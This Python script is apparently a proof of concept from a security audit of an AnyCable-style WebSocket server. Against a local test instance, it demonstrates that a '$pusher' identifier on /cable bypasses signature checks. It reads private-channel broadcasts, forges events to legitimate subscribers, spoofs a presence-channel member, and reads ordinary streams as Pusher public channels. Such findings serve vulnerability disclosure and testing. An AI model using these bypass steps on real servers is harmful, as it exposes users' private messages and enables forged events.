#!/usr/bin/env python3
"""Finding 1: with Pusher compatibility on, the `$pusher` channel is reachable
from the Action Cable endpoint without the Pusher signature check, and Pusher
public channels share the stream namespace of every other stream.

usage: python3 01_pusher_bypass.py <cabby | anycable-go binary>

The server runs with connection auth off (--noauth) but NO public streams, so
`$pubsub` streams still need a signature: the only way to a stream should be a
valid signature (signed stream, or Pusher private-channel auth).
"""
import json
from seclib import Server, WS, binary_arg, free_port, http_post, pusher_auth, verdict

APP_ID, APP_KEY, SECRET = "app1", "key1", "pusher-top-secret"
bport = free_port()
srv = Server(
    binary_arg(),
    [
        "--noauth", "--norpc", "--presets=none",
        f"--pusher_app_id={APP_ID}", f"--pusher_app_key={APP_KEY}", f"--pusher_secret={SECRET}",
        "--streams_secret=streams-secret",
        "--broadcast_adapter=http", f"--http_broadcast_port={bport}", "--http_broadcast_secret=none",
        "--broker=memory", "--log_level=debug",
    ],
    name="pusher",
)


def broadcast(stream, data):
    return http_post(bport, "/_broadcast", json.dumps({"stream": stream, "data": json.dumps(data)}).encode())


try:
    # --- control: the Pusher endpoint rejects a private channel without a valid signature
    p = WS(srv.port, f"/app/{APP_KEY}")
    est = p.recv_json()
    socket_id = json.loads(est["data"])["socket_id"]
    p.send_json({"event": "pusher:subscribe", "data": {"channel": "private-orders", "auth": f"{APP_KEY}:deadbeef"}})
    print("control (Pusher endpoint, bad signature):", p.try_json())

    # --- control: `$pubsub` without a signature is rejected on /cable
    c0 = WS(srv.port, "/cable")
    c0.recv_json()
    c0.send_json({"command": "subscribe", "identifier": json.dumps({"channel": "$pubsub", "stream_name": "private-orders"})})
    print("control ($pubsub unsigned on /cable):", c0.try_json())

    # --- a legitimate Pusher subscriber of the private channel (valid signature)
    legit = WS(srv.port, f"/app/{APP_KEY}")
    sid = json.loads(legit.recv_json()["data"])["socket_id"]
    legit.send_json({"event": "pusher:subscribe",
                     "data": {"channel": "private-orders", "auth": pusher_auth(APP_KEY, SECRET, sid, "private-orders")}})
    print("legit Pusher subscriber:", legit.try_json())

    # --- attack 1a: /cable, `$pusher` identifier, no signature at all
    a = WS(srv.port, "/cable", protocol="actioncable-v1-ext-json")
    print("attacker welcome:", a.recv_json())
    ident = json.dumps({"channel": "$pusher", "stream": "private-orders"})
    a.send_json({"command": "subscribe", "identifier": ident})
    confirm = a.try_json()
    print("attacker subscribe to private-orders via /cable:", confirm)
    subscribed = isinstance(confirm, dict) and confirm.get("type") == "confirm_subscription"

    print("broadcast status:", broadcast("private-orders", {"event": "order.paid", "data": "card ending 4242"}))
    got = a.try_json()
    print("attacker received:", got)
    verdict("1a read a Pusher private channel from /cable without a signature",
            subscribed and isinstance(got, dict) and "4242" in json.dumps(got))

    # --- attack 1a': forge an event (any name) to the legitimate Pusher subscribers
    legit.try_json(1)  # drain the broadcast above
    a.send_json({"command": "whisper", "identifier": ident,
                 "data": {"event": "order.refunded", "data": "forged by attacker"}})
    forged = legit.try_json()
    print("legit Pusher subscriber received:", forged)
    verdict("1a' forge a server-named event on the private channel",
            isinstance(forged, dict) and forged.get("event") == "order.refunded")

    # --- attack 1a'': presence channel roster without a signature
    pres = json.dumps({"channel": "$pusher", "stream": "presence-room"})
    a.send_json({"command": "subscribe", "identifier": pres})
    pc = a.try_json()
    print("attacker subscribe to presence-room via /cable:", pc)
    a.send_json({"command": "join", "identifier": pres, "presence": {"id": "ceo", "info": {"name": "spoofed"}}})
    a.send_json({"command": "presence", "identifier": pres})
    roster = a.try_json()
    print("presence after spoofed join:", roster)
    verdict("1a'' join a presence channel as an arbitrary user without a signature",
            isinstance(roster, dict) and "ceo" in json.dumps(roster))

    # --- attack 1b: Pusher public channel named like a non-Pusher stream (no auth at all)
    u = WS(srv.port, f"/app/{APP_KEY}")
    u.recv_json()
    u.send_json({"event": "pusher:subscribe", "data": {"channel": "notifications:42"}})
    print("unauthenticated Pusher subscribe to stream 'notifications:42':", u.try_json())
    broadcast("notifications:42", {"event": "dm", "data": "private message for user 42"})
    leak = u.try_json()
    print("unauthenticated Pusher client received:", leak)
    verdict("1b read an Action Cable stream as a Pusher public channel (messages with an `event` key)",
            isinstance(leak, dict) and "user 42" in json.dumps(leak))
    print("server alive:", srv.alive(), "| log:", srv.log_path)
finally:
    srv.stop()
